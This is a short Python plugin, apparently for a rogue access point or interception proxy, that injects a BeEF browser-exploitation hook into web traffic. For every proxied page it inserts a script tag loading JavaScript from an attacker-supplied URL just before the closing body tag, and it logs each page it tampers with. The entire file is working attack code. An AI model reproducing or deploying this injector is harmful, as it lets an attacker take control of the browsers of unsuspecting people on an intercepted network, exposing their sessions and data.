from Plugin import PluginProxy
import logging
from core.utils import setup_logger

class beef(PluginProxy):
    ''' this module proxy inject hook beef api.'''
    _name          = 'beef_hook'
    _argsname      = 'Url:'
    _activated     = False
    _instance      = None
    _requiresArgs  = True
    _session       = None

    @staticmethod
    def getInstance():
        if beef._instance is None:
            beef._instance = beef()
        return beef._instance

    def __init__(self):
        self.hook_url = None

    def LoggerInjector(self,session):
        setup_logger('injectionPage', './logs/AccessPoint/injectionPage.log',session)
        self.logging = logging.getLogger('injectionPage')

    def setInjectionCode(self, code,session):
        self.hook_url = code
        self.LoggerInjector(session)

    def inject(self, data, url):
        injection_code = '<script type="text/javascript" src="{}"></script>'.format(self.hook_url)
        self.logging.info("Injected: %s" % (url))
        return data.replace('</body>', '{}</body>'.format(injection_code))
